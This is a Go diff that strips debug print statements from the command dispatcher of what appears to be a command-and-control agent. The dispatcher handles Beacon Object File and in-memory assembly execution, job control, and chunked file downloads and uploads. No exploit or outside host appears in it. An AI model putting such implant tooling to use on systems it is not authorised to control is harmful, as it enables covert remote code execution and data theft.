@@ -41,14 +41,12 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	// IMPORTANT: Handle inline-assembly job management commands FIRST
 	// These commands don't have data and should be processed before the data check
 	if cmd.Command == "inline-assembly-jobs" {
-		fmt.Printf("DEBUG: Executing inline-assembly-jobs command\n")
 		if handler, exists := cq.cmdRegistry["inline-assembly-jobs"]; exists {
 			result := handler.Execute(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
 		} else {
-			fmt.Printf("DEBUG: inline-assembly-jobs handler not found in registry\n")
 			return &CommandResult{
 				Command:     cmd,
 				ErrorString: "inline-assembly-jobs command not registered",
@@ -60,7 +58,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle inline-assembly-jobs-clean command
 	if strings.HasPrefix(cmd.Command, "inline-assembly-jobs-clean") {
-		fmt.Printf("DEBUG: Executing inline-assembly-jobs-clean command\n")
 		parts := strings.Fields(cmd.Command)
 		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-clean"]; exists {
 			args := []string{}
@@ -76,7 +73,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle inline-assembly-jobs-stats command
 	if cmd.Command == "inline-assembly-jobs-stats" {
-		fmt.Printf("DEBUG: Executing inline-assembly-jobs-stats command\n")
 		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-stats"]; exists {
 			result := handler.Execute(cq.cmdContext, []string{})
 			result.Command = cmd
@@ -103,7 +99,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle inline-assembly-kill command WITH arguments
 	if strings.HasPrefix(cmd.Command, "inline-assembly-kill ") {
-		fmt.Printf("DEBUG: Executing inline-assembly-kill command with args\n")
 		parts := strings.Fields(cmd.Command)
 		if handler, exists := cq.cmdRegistry["inline-assembly-kill"]; exists {
 			args := []string{}
@@ -119,14 +114,11 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// NOW handle inline-assembly commands WITH data (actual assembly execution)
 	if strings.HasPrefix(cmd.Command, "inline-assembly") && cmd.Data != "" {
-		fmt.Printf("DEBUG: Processing inline-assembly command with embedded data\n")
 
 		// Parse the JSON data to check if it's valid
 		var testParse map[string]interface{}
 		if err := json.Unmarshal([]byte(cmd.Data), &testParse); err != nil {
-			fmt.Printf("DEBUG: Failed to parse inline-assembly data as JSON: %v\n", err)
 		} else {
-			fmt.Printf("DEBUG: Successfully parsed inline-assembly JSON data\n")
 		}
 
 		// Determine if it's async or regular
@@ -137,13 +129,11 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 		// Execute using the appropriate handler
 		if handler, exists := cq.cmdRegistry[handlerName]; exists {
-			fmt.Printf("DEBUG: Found %s handler, executing\n", handlerName)
 			result := handler.Execute(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
 		} else {
-			fmt.Printf("DEBUG: %s handler not found in registry\n", handlerName)
 			return &CommandResult{
 				Command:     cmd,
 				ErrorString: fmt.Sprintf("%s handler not registered", handlerName),
@@ -155,12 +145,10 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle BOF async commands
 	if strings.HasPrefix(cmd.Command, "bof-async") && cmd.Data != "" {
-		fmt.Printf("DEBUG: Processing async BOF command with embedded data\n")
 
 		// Parse the JSON data
 		var bofConfig map[string]interface{}
 		if err := json.Unmarshal([]byte(cmd.Data), &bofConfig); err != nil {
-			fmt.Printf("DEBUG: Failed to parse BOF data as JSON: %v\n", err)
 			// Fall back to treating it as raw BOF data for backwards compatibility
 			result := cq.processBOFAsync(cmd)
 			return &result, nil
@@ -177,13 +165,10 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle regular BOF commands
 	if strings.HasPrefix(cmd.Command, "bof") && cmd.Data != "" {
-		fmt.Printf("DEBUG: Processing BOF command with embedded data\n")
-		fmt.Printf("DEBUG: BOF filename: %s\n", cmd.Filename)
 
 		// Parse the JSON data
 		var bofConfig map[string]interface{}
 		if err := json.Unmarshal([]byte(cmd.Data), &bofConfig); err != nil {
-			fmt.Printf("DEBUG: Failed to parse BOF data as JSON: %v\n", err)
 			// Fall back to treating it as raw BOF data for backwards compatibility
 			result := cq.processBOF(cmd)
 			return &result, nil
@@ -215,15 +200,12 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// Handle download continuation
 	if cmd.Filename != "" && cmd.CurrentChunk > 0 {
-		fmt.Printf("[DEBUG] Handling download continuation for file: %s, chunk: %d/%d\n",
-			cmd.Filename, cmd.CurrentChunk, cmd.TotalChunks)
 
 		cq.mu.Lock()
 		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
 		cq.mu.Unlock()
 
 		if !exists {
-			fmt.Printf("[DEBUG] No active download found for file: %s\n", cmd.Filename)
 			return &CommandResult{
 				Command:     cmd,
 				Error:       fmt.Errorf("no active download found for %s", cmd.Filename),
@@ -234,7 +216,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		}
 
 		if !downloadInfo.InProgress {
-			fmt.Printf("[DEBUG] Download no longer active for file: %s\n", cmd.Filename)
 			return &CommandResult{
 				Command:     cmd,
 				Error:       fmt.Errorf("download for %s is no longer active", cmd.Filename),
@@ -246,7 +227,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
 		if err != nil {
-			fmt.Printf("[DEBUG] Error getting next chunk: %v\n", err)
 			return &CommandResult{
 				Command:     cmd,
 				Error:       err,
@@ -257,8 +237,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		}
 
 		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)
-		fmt.Printf("[DEBUG] Successfully processed chunk %d/%d for file: %s\n",
-			cmd.CurrentChunk, cmd.TotalChunks, cmd.Filename)
 
 		return result, nil
 	}
@@ -269,7 +247,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 
 	// For BOF commands and variants, handle them specially
 	if strings.HasPrefix(cmdType, "bof") {
-		fmt.Printf("DEBUG: Processing BOF variant command: %s\n", cmdType)
 		parts := strings.Fields(cmd.Command)
 		if len(parts) > 0 {
 			cmdType = parts[0]
@@ -284,11 +261,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		if strings.HasPrefix(cmdLower, "download") {
 			// Use special parsing for download that treats everything after "download" as one argument
 			args = parseDownloadCommand(cmd.Command)
-			fmt.Printf("DEBUG: Download command parsed to: %v\n", args)
 		} else if strings.HasPrefix(cmdLower, "upload") {
 			// Use special parsing for upload that treats everything after "upload" as one argument
 			args = parseUploadCommand(cmd.Command)
-			fmt.Printf("DEBUG: Upload command parsed to: %v\n", args)
 		} else {
 			// Use improved general parser for all other commands
 			args = parseCommandLine(cmd.Command)
@@ -307,7 +282,6 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		cmdArgs = args[1:]
 	}
 
-	fmt.Printf("DEBUG: Executing command handler for: %s with args: %v\n", cmdType, cmdArgs)
 
 	// Look up command handler
 	if handler, exists := cq.cmdRegistry[cmdType]; exists {
